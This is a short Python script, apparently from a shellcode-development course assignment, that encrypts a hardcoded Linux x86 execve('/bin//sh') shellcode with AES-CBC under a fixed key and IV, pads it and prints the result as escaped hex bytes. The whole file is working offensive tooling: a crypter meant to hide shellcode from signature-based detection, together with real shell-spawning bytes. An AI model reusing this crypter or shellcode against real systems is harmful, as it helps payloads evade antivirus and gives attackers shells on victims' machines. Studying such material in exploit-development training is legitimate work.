from Crypto.Cipher import AES
import sys

shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80") # must be divisible by 16

key = ("SecurityTubeSLAE") # must be 16 bytes

iv = ("l0lZ") * 4 # must be 16 bytes

if len(key)!=16:
	print("[!]key MUST be 16 bytes\n[!]Exiting")
	sys.exit()
if len(iv)!=16:
	print("[!]iv MUST be 16 bytes\n[!]Exiting")
	sys.exit()
cipher = AES.new(key, AES.MODE_CBC, iv)


if len(shellcode)%16 !=0:
	print ("[!]shellcode not divisible by 16, padding")
	remainder = len(shellcode)%16 #figure out how many extra chars there are stopping it being divisible by 16
	padnumber = 16 - remainder #figure out how many characters we need to make up the difference
	shellcode = shellcode + ('!' * padnumber) #add exactly that many chars to the end of shellcode, thus making it divisible by 16


encrypt = cipher.encrypt(shellcode) # use cypher to encrypt ourshellcode against specified key and iv
encoded = ""
for x in bytearray(encrypt): #process code to give us shellcode as we have done in previous assignments
	  encoded += '\\x'
	  encrypt = '%02x' % x
	  encoded += encrypt

print(encoded)
